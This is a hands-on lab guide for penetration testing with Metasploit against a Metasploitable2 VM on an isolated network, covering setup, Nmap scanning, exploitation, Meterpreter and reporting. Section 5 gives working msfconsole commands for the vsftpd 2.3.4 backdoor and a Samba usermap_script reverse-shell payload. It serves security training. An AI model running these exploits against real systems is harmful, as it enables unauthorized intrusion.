# Penetration Testing with Metasploit
### A Hands-On Lab Project for Authorized, Isolated Environments

---

## ⚠️ LEGAL & ETHICAL DISCLAIMER

> **This project is strictly for educational use in an isolated, self-owned lab environment.**
>
> All techniques, commands, and scenarios described in this document must **only** be performed against systems you own or are explicitly authorized to test — such as **Metasploitable2/3**, **DVWA**, or other intentionally vulnerable VMs running on a private, host-only (non-internet-facing) network.
>
> - Do **NOT** run any of these techniques against production systems, third-party networks, or any system you do not own or have **written authorization** to test.
> - Unauthorized access to computer systems is illegal under laws such as the U.S. Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent legislation worldwide.
> - This document is intended to demonstrate skills for portfolio, training, and certification-preparation purposes (e.g., OSCP, PNPT, Security+ practical study).
> - The author/reader assumes full responsibility for ensuring all testing occurs within a legally authorized and isolated scope.

---

## 1. Project Overview

### 1.1 Objective
The objective of this project is to demonstrate a complete, methodical **penetration testing engagement** against a deliberately vulnerable virtual machine, using **Metasploit Framework** as the primary exploitation platform. The project follows an industry-standard methodology: reconnaissance → scanning → vulnerability analysis → exploitation → post-exploitation → reporting.

This simulates a real-world internal penetration test workflow while remaining entirely inside a personally-owned, isolated lab network.

### 1.2 Scope

| Item | Detail |
|---|---|
| **In Scope** | Target VM (Metasploitable2) on host-only virtual network `192.168.56.0/24` |
| **Out of Scope** | Any host outside the isolated virtual network; any production/live/third-party system |
| **Testing Window** | Self-paced lab exercise |
| **Authorization** | Self-authorized — lab owned and operated entirely by the tester |
| **Rules of Engagement** | No testing outside the host-only adapter; no internet-facing exposure of the target VM |

### 1.3 Tools Used

| Tool | Purpose |
|---|---|
| **Kali Linux** | Attacker workstation — pre-loaded with pentest tooling |
| **Metasploit Framework (msfconsole)** | Exploitation and post-exploitation framework |
| **Nmap** | Host discovery, port scanning, service/version enumeration |
| **Metasploitable2** | Intentionally vulnerable target VM (Linux-based) |
| **VirtualBox / VMware Workstation** | Hypervisor for building the isolated lab |
| **Wireshark** *(optional)* | Packet capture for traffic analysis/verification |

### 1.4 Lab Architecture

```
 ┌─────────────────────────────────────────────────────────┐
 │                    Host Machine (Physical)                │
 │                                                           │
 │   ┌───────────────────────┐     ┌───────────────────────┐ │
 │   │      Kali Linux       │     │    Metasploitable2     │ │
 │   │   (Attacker VM)       │     │     (Target VM)         │ │
 │   │  IP: 192.168.56.10    │◄───►│  IP: 192.168.56.20      │ │
 │   └───────────┬───────────┘     └───────────┬─────────────┘ │
 │               │                              │              │
 │               └───────────  Host-Only Network ──────────────┘
 │                        (VirtualBox: vboxnet0)              │
 │                     No internet / NAT bridging enabled      │
 └─────────────────────────────────────────────────────────┘
```

- **Attacker VM:** Kali Linux, static IP on host-only adapter
- **Target VM:** Metasploitable2, static IP on the same host-only adapter
- **Network:** Host-only virtual switch — no route to the internet or physical LAN
- **Isolation control:** Both VMs' network adapters set to "Host-Only Adapter" only (no NAT/Bridged adapter enabled during testing)

---

## 2. Environment Setup

### 2.1 Prerequisites
- Host machine with virtualization enabled in BIOS (Intel VT-x / AMD-V)
- VirtualBox (or VMware Workstation/Player) installed
- Kali Linux VM image (official `.ova` from kali.org)
- Metasploitable2 VM image (official download, e.g., from SourceForge/Rapid7)
- Minimum 8GB RAM host (4GB+ recommended to allocate across both VMs)

### 2.2 Step-by-Step Lab Build

**Step 1 — Create an isolated Host-Only Network**
1. Open VirtualBox → **File → Host Network Manager**
2. Create a new Host-Only adapter (e.g., `vboxnet0`)
3. Set the adapter's IPv4 address to `192.168.56.1`, mask `255.255.255.0`
4. **Disable DHCP** on this adapter (assign static IPs manually for predictability)

**Step 2 — Import and Configure Kali Linux**
1. Import the Kali `.ova` file: **File → Import Appliance**
2. Allocate resources (2 CPUs, 4GB RAM minimum recommended)
3. Go to VM **Settings → Network → Adapter 1**
   - Attached to: **Host-only Adapter**
   - Name: `vboxnet0`
4. Boot Kali, log in, and set a static IP:
   ```bash
   sudo ip addr add 192.168.56.10/24 dev eth0
   sudo ip link set eth0 up
   ```
   *(Or configure persistently via `/etc/network/interfaces` or NetworkManager)*

**Step 3 — Import and Configure Metasploitable2**
1. Extract the Metasploitable2 `.vmdk`/`.ova` and create a new VM in VirtualBox
2. Go to VM **Settings → Network → Adapter 1**
   - Attached to: **Host-only Adapter**
   - Name: `vboxnet0`
3. Boot the VM (default credentials: `msfadmin` / `msfadmin` — lab-only, never reuse)
4. Confirm/set static IP:
   ```bash
   sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up
   ```

**Step 4 — Verify Isolation**
- Confirm **neither VM** has a Bridged or NAT adapter enabled during active testing.
- Optionally disable the host machine's Wi-Fi/Ethernet while testing for an extra air-gap.

### 2.3 Connectivity Verification

From Kali:
```bash
ping -c 4 192.168.56.20
```
Expected: successful ICMP replies, confirming attacker → target connectivity on the isolated segment.

```bash
sudo netdiscover -r 192.168.56.0/24
```
Confirms both hosts are visible only on the private host-only subnet.

---

## 3. Reconnaissance & Scanning

### 3.1 Nmap Scanning Methodology

**Step 1 — Host Discovery**
```bash
nmap -sn 192.168.56.0/24
```
Identifies live hosts on the isolated subnet without port scanning.

**Step 2 — Full Port Scan**
```bash
nmap -p- -T4 192.168.56.20
```
Scans all 65,535 TCP ports to identify the full attack surface.

**Step 3 — Service & Version Detection**
```bash
nmap -sV -sC -p <open_ports> 192.168.56.20 -oA metasploitable2_scan
```
- `-sV`: version detection
- `-sC`: default Nmap scripts (banner grabbing, basic enumeration)
- `-oA`: saves output in all formats (normal, XML, grepable) for later import

**Expected findings on Metasploitable2** typically include open services such as: FTP (21 — vsftpd 2.3.4), SSH (22), Telnet (23), SMTP (25), DNS (53), HTTP (80), RPC (111), NetBIOS/Samba (139/445), MySQL (3306), and others — a deliberately broad, outdated attack surface.

### 3.2 Importing Scan Results into Metasploit

Start Metasploit's database and console:
```bash
sudo msfdb init
msfconsole
```

Inside `msfconsole`:
```bash
db_status
db_nmap -sV -sC 192.168.56.20
```
Or import a previously saved XML scan:
```bash
db_import metasploitable2_scan.xml
hosts
services
```

This populates Metasploit's internal database with hosts, ports, and services — allowing later modules to auto-populate `RHOSTS` and enabling correlation via `services -p <port>`.

---

## 4. Vulnerability Analysis

### 4.1 Identifying Vulnerable Services

From the `services` table in Metasploit (or the Nmap output), flag services with known, publicly-documented vulnerabilities. Example entries for Metasploitable2:

| Port | Service | Notable Weakness |
|---|---|---|
| 21 | vsftpd 2.3.4 | Known backdoor vulnerability (CVE-2011-2523) |
| 445 | Samba | Vulnerable to known exploits (e.g., `usermap_script`) |
| 6667 | UnrealIRCd | Backdoored version (CVE-2010-2075) |
| 3306 | MySQL | Weak/default credentials |
| 23 | Telnet | Unencrypted, weak default credentials |

### 4.2 Matching Services to Modules

Inside `msfconsole`, search for relevant modules:
```bash
search vsftpd
search type:exploit platform:unix name:samba
```

Inspect a module before use:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
info
```

`info` displays the module's description, required options (`RHOSTS`, `RPORT`), supported targets, references (CVE/EDB-ID), and disclosure date — critical for confirming applicability before attempting exploitation.

---

## 5. Exploitation Methodology (Conceptual Walkthrough)

### 5.1 Metasploit Workflow Overview

Standard exploitation flow inside `msfconsole`:
```bash
use <module_path>
show options
set RHOSTS 192.168.56.20
set RPORT <port>
set PAYLOAD <payload_path>
set LHOST 192.168.56.10
exploit
```

### 5.2 msfconsole Structure

| Component | Description |
|---|---|
| **Exploits** | Code that leverages a specific vulnerability to gain access |
| **Payloads** | Code delivered upon successful exploitation (e.g., a reverse shell, Meterpreter) |
| **Auxiliary** | Modules for scanning, fuzzing, DoS testing — no direct exploitation |
| **Encoders** | Obfuscate payloads to evade basic signature detection (lab/study context) |
| **Post** | Modules run after a session is established (enumeration, privilege escalation) |
| **Sessions** | Active connections to compromised hosts, manageable via `sessions -i <id>` |

### 5.3 Documented Example Scenarios

**Scenario A — vsftpd 2.3.4 Backdoor (FTP, Port 21)**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
exploit
```
*Concept:* This specific vsftpd version contains a maliciously inserted backdoor triggered by a crafted login string, which opens a shell on port 6200. This is a textbook example of a supply-chain/backdoor vulnerability used for teaching detection and remediation awareness.

**Scenario B — Samba `usermap_script` (Port 445/139)**
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.20
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.10
exploit
```
*Concept:* Demonstrates a command-injection flaw in older Samba configurations, resulting in remote command execution — used here to illustrate improper input sanitization in legacy network services.

> Both scenarios are exercised solely against the Metasploitable2 target for training purposes and should never be attempted against unauthorized systems.

---

## 6. Post-Exploitation

### 6.1 Session Handling (Meterpreter Basics — Conceptual)

Once a session is established:
```bash
sessions -l          # list active sessions
sessions -i 1        # interact with session 1
```

Common Meterpreter concepts (for study purposes):
- `sysinfo` — gather target OS/architecture info
- `getuid` — confirm current privilege context
- `ps` / `migrate` — process listing and migration for stability
- `background` — return to msfconsole without killing the session

### 6.2 Privilege Escalation Concepts

- Enumerate for misconfigurations: writable `/etc/passwd`, SUID binaries, outdated kernel versions
- Metasploit's `post/multi/recon/local_exploit_suggester` can suggest applicable local privilege-escalation modules based on the target's enumerated details
- Conceptually, escalation exploits a **secondary** flaw (e.g., kernel exploit, misconfigured cron job) distinct from the initial foothold vulnerability

### 6.3 Evidence Gathering for Reporting

For each successful step, document:
- Command executed and module used
- Screenshot of output (redact in real engagements if needed)
- Timestamp
- Resulting access level (user vs. root/administrator)
- Any files, credentials, or configuration evidence retrieved (hashes, config files) — used strictly to substantiate findings, never exfiltrated beyond the lab

---

## 7. Reporting

### 7.1 Professional Pentest Report Template

```markdown
# Penetration Test Report — [Lab Project Name]

## 1. Executive Summary
Brief, non-technical summary of testing objectives, high-level findings,
and overall risk posture. Written for a management/non-technical audience.

## 2. Scope & Methodology
- Testing dates
- In-scope systems (IP addresses / hostnames)
- Methodology followed (e.g., PTES, OWASP, or custom lab methodology)
- Tools used

## 3. Findings Summary Table

| Finding ID | Vulnerability | Severity | CVSS Score | Affected Host/Service |
|---|---|---|---|---|
| F-01 | vsftpd 2.3.4 Backdoor | Critical | 9.8 | 192.168.56.20:21 |
| F-02 | Samba usermap_script RCE | Critical | 9.8 | 192.168.56.20:445 |
| F-03 | Weak/Default Credentials | High | 7.5 | Multiple services |

## 4. Detailed Findings

### F-01: vsftpd 2.3.4 Backdoor
- **Description:** [technical explanation]
- **Impact:** Full remote command execution as root
- **Evidence:** [screenshot placeholder]
- **CVSS Vector:** [vector string]
- **Remediation:** Upgrade vsftpd to a patched version; verify package
  integrity/checksums against vendor-published hashes.

### F-02: Samba usermap_script RCE
- **Description:** [technical explanation]
- **Impact:** Remote command execution via crafted username field
- **Evidence:** [screenshot placeholder]
- **CVSS Vector:** [vector string]
- **Remediation:** Patch Samba to a supported version; disable
  legacy `usermap_script` configuration option.

## 5. Risk Rating Methodology
Explain the CVSS-based or qualitative (Critical/High/Medium/Low/Info)
rating system used.

## 6. Overall Remediation Roadmap
Prioritized list of fixes, grouped by effort and risk reduction.

## 7. Appendix
- Full Nmap output
- Full Metasploit console logs
- Screenshot gallery
```

### 7.2 Risk Rating Guidance (Example)

| Severity | CVSS Range | Example |
|---|---|---|
| Critical | 9.0–10.0 | Unauthenticated RCE (vsftpd backdoor) |
| High | 7.0–8.9 | Authenticated RCE, weak credential exposure |
| Medium | 4.0–6.9 | Information disclosure, misconfig without direct RCE |
| Low | 0.1–3.9 | Minor info leakage, verbose banners |

---

## 8. Deliverables

This project produces the following portfolio-ready artifacts:

1. **Lab Setup Guide** — Section 2 of this document (VM build + network isolation steps)
2. **Final Pentest Report** — populated version of the Section 7 template, exported to Markdown or Word (.docx)
3. **Command/Screenshot Log** — supporting evidence appendix
4. **This Project Document** — serves as a portfolio showcase piece

### 8.1 Lessons Learned / Skills Demonstrated (Portfolio Summary)

> Use this section to summarize your experience for a resume, GitHub README, or LinkedIn portfolio post.

**Skills Demonstrated:**
- Isolated virtual lab design and network segmentation (VirtualBox host-only networking)
- Reconnaissance and enumeration methodology using Nmap
- Vulnerability identification and CVE-mapping
- Practical exploitation using Metasploit Framework (exploits, payloads, auxiliary modules)
- Post-exploitation session management and privilege escalation concepts (Meterpreter)
- Professional security report writing, including CVSS-based risk rating and remediation guidance
- Adherence to ethical, authorized testing practices and scope discipline

**Example Resume Bullet:**
> *"Designed and executed a full penetration testing engagement in an isolated virtual lab, using Nmap and Metasploit Framework to identify, exploit, and document critical vulnerabilities on an intentionally vulnerable Linux target, culminating in a professional CVSS-rated vulnerability report."*

---

*End of document. Remember: always operate within an isolated, authorized lab. Never target systems without explicit written permission.*
